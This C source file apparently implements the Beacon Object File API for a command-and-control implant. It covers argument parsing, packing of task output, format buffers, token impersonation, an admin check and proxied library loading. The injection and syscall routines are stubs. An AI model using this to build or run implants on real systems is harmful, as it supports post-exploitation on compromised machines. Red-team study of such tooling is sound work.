#include "beacon.h"
#include "utils.h"
#include "ApiLoader.h"
#include "Packer.h"

Packer* bofOutputPacker = NULL;
int     bofOutputCount  = 0;
ULONG   bofTaskId       = 0;

ULONG bofImpersonate = 1;

void BofOutputToTask(int type, PBYTE data, int dataSize)
{
	if (bofOutputPacker) {
		bofOutputPacker->Pack32(bofTaskId);
		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
		bofOutputPacker->Pack32(type);
		bofOutputPacker->PackBytes(data, dataSize);
	}
}

unsigned int swap_endianess(unsigned int indata)
{
	unsigned int testint = 0xaabbccdd;
	unsigned int outint = indata;
	if (((unsigned char*)&testint)[0] == 0xdd) {
		((unsigned char*)&outint)[0] = ((unsigned char*)&indata)[3];
		((unsigned char*)&outint)[1] = ((unsigned char*)&indata)[2];
		((unsigned char*)&outint)[2] = ((unsigned char*)&indata)[1];
		((unsigned char*)&outint)[3] = ((unsigned char*)&indata)[0];
	}
	return outint;
}


/// Data Parser API

//char* BeaconDataPtr(datap* parser, int size);

void BeaconDataParse(datap* parser, char* buffer, int size)
{
	if (parser == NULL) {
		return;
	}
	parser->original = buffer;
	parser->buffer = buffer;
	parser->length = size - 4;
	parser->size = size - 4;
	parser->buffer += 4;
	return;
}

int BeaconDataInt(datap* parser)
{
	int fourbyteint = 0;
	if (parser->length < 4) {
		return 0;
	}
	memcpy(&fourbyteint, parser->buffer, 4);
	parser->buffer += 4;
	parser->length -= 4;
	return (int)fourbyteint;
}

short BeaconDataShort(datap* parser)
{
	short retvalue = 0;
	if (parser->length < 2) {
		return 0;
	}
	memcpy(&retvalue, parser->buffer, 2);
	parser->buffer += 2;
	parser->length -= 2;
	return (short)retvalue;
}

int BeaconDataLength(datap* parser)
{
	return parser->length;
}

char* BeaconDataExtract(datap* parser, int* size)
{
	unsigned int length = 0;
	char* outdata = NULL;
	if (parser->length < 4) {
		return NULL;
	}
	memcpy(&length, parser->buffer, 4);
	parser->buffer += 4;

	outdata = parser->buffer;
	if (outdata == NULL) {
		return NULL;
	}
	parser->length -= 4;
	parser->length -= length;
	parser->buffer += length;
	if (size != NULL && outdata != NULL) {
		*size = length;
	}
	return outdata;
}


/// Output API

void BeaconOutput(int type, const char* data, int len)
{
	BofOutputToTask(type, (PBYTE)data, len);
}

void BeaconPrintf(int type, const char* fmt, ...)
{
	int length = 0;
	va_list args;

	va_start(args, fmt);
	length = ApiWin->vsnprintf(NULL, 0, fmt, args) + 1;
	va_end(args);

	char* tmp_output = (char*)MemAllocLocal(length);

	va_start(args, fmt);
	length = ApiWin->vsnprintf(tmp_output, length, fmt, args);
	va_end(args);

	BofOutputToTask(type, (PBYTE)tmp_output, length);

	MemFreeLocal((LPVOID*)&tmp_output, length);
}


/// Format API

void BeaconFormatAlloc(formatp* format, int maxsz)
{
	if (format == NULL) {
		return;
	}
	format->original = (PCHAR)ApiWin->LocalAlloc(maxsz, 1);
	format->buffer = format->original;
	format->length = 0;
	format->size = maxsz;
	return;
}

void BeaconFormatReset(formatp* format)
{
	memset(format->original, 0, format->size);
	format->buffer = format->original;
	format->length = format->size;
	return;
}

void BeaconFormatAppend(formatp* format, const char* text, int len)
{
	memcpy(format->buffer, text, len);
	format->buffer += len;
	format->length += len;
	return;
}

void BeaconFormatPrintf(formatp* format, const char* fmt, ...)
{
	va_list args;
	int length = 0;

	va_start(args, fmt);
	length = ApiWin->vsnprintf(NULL, 0, fmt, args);
	va_end(args);
	if (format->length + length > format->size) {
		return;
	}

	va_start(args, fmt);
	ApiWin->vsnprintf(format->buffer, length, fmt, args);
	va_end(args);
	format->length += length;
	format->buffer += length;
	return;
}

char* BeaconFormatToString(formatp* format, int* size)
{
	if(size != NULL)
		*size = format->length;

	format->buffer[0] = '\0';
	format->buffer += 1;
	format->length += 1;
	return format->original;
}

void BeaconFormatFree(formatp* format)
{
	if (format == NULL) {
		return;
	}
	if (format->original) {
		MemFreeLocal((LPVOID*) &format->original, format->size);
	}
	format->buffer = NULL;
	format->length = 0;
	format->size = 0;
	return;
}

void BeaconFormatInt(formatp* format, int value)
{
	unsigned int indata = value;
	unsigned int outdata = 0;
	if (format->length + 4 > format->size) {
		return;
	}
	outdata = swap_endianess(indata);
	memcpy(format->buffer, &outdata, 4);
	format->length += 4;
	format->buffer += 4;
	return;
}


/// Internal APIs

BOOL BeaconUseToken(HANDLE token)
{
	if (ApiWin->SetThreadToken(NULL, token) || ApiWin->ImpersonateLoggedOnUser(token) ) {
		bofImpersonate = 2;
		return TRUE;
	}
	return FALSE;
}

void BeaconRevertToken(void)
{
	ApiWin->RevertToSelf();
	bofImpersonate = 0;
}

BOOL BeaconIsAdmin(void)
{
	BOOL high = IsElevate();
	return high;
}

void BeaconGetSpawnTo(BOOL x86, char* buffer, int length)
{
	char* tempBufferPath = NULL;
	if ( !buffer )
		return;
}

BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo)
{
	BOOL bSuccess = FALSE;
	return bSuccess;
}

VOID BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
{

}

VOID BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len)
{

}

VOID BeaconCleanupProcess(PROCESS_INFORMATION* pInfo)
{

}

PDATA_STORE_OBJECT BeaconDataStoreGetItem(SIZE_T index)
{
	return NULL;
}

VOID BeaconDataStoreProtectItem(SIZE_T index)
{

}

VOID BeaconDataStoreUnprotectItem(SIZE_T index)
{

}

ULONG BeaconDataStoreMaxEntries()
{
	return NULL;
}

BOOL toWideChar(char* src, wchar_t* dst, int max)
{
	if (max < sizeof(wchar_t))
		return FALSE;
	return ApiWin->MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, src, -1, dst, max / sizeof(wchar_t));
}

BOOL BeaconInformation(BEACON_INFO* info) 
{ 
	return FALSE; 
}

BOOL BeaconAddValue(const char* key, void* ptr)
{
	return TRUE;
}

PVOID BeaconGetValue(const char* key)
{
	return NULL;
}

BOOL BeaconRemoveValue(const char* key)
{
	return FALSE;
}

PCHAR BeaconGetCustomUserData() 
{
	return NULL;
}

/// System Call API

BOOL BeaconGetSyscallInformation(PBEACON_SYSCALLS info, BOOL resolveIfNotInitialized)
{
	return FALSE;
}

//LPVOID BeaconVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//LPVOID BeaconVirtualAllocEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//BOOL BeaconVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
//BOOL BeaconVirtualProtectEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
//BOOL BeaconVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
//BOOL BeaconGetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
//BOOL BeaconSetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
//DWORD BeaconResumeThread(HANDLE threadHandle);
//HANDLE BeaconOpenProcess(DWORD desiredAccess, BOOL inheritHandle, DWORD processId);
//HANDLE BeaconOpenThread(DWORD desiredAccess, BOOL inheritHandle, DWORD threadId);
//BOOL BeaconCloseHandle(HANDLE object);
//BOOL BeaconUnmapViewOfFile(LPCVOID baseAddress);
//SIZE_T BeaconVirtualQuery(LPCVOID address, PMEMORY_BASIC_INFORMATION buffer, SIZE_T length);
//BOOL BeaconDuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
//BOOL BeaconReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
//BOOL BeaconWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);

HMODULE proxy_LoadLibraryA(LPCSTR lpLibFileName)
{
	return ApiWin->LoadLibraryA(lpLibFileName);
}

HMODULE proxy_GetModuleHandleA(LPCSTR lpModuleName)
{
	return ApiWin->GetModuleHandleA(lpModuleName);
}

FARPROC proxy_GetProcAddress(HMODULE hModule, LPCSTR  lpProcName)
{
	return ApiWin->GetProcAddress(hModule, lpProcName);
}

BOOL proxy_FreeLibrary(HMODULE hLibModule)
{
	return ApiWin->FreeLibrary(hLibModule);
}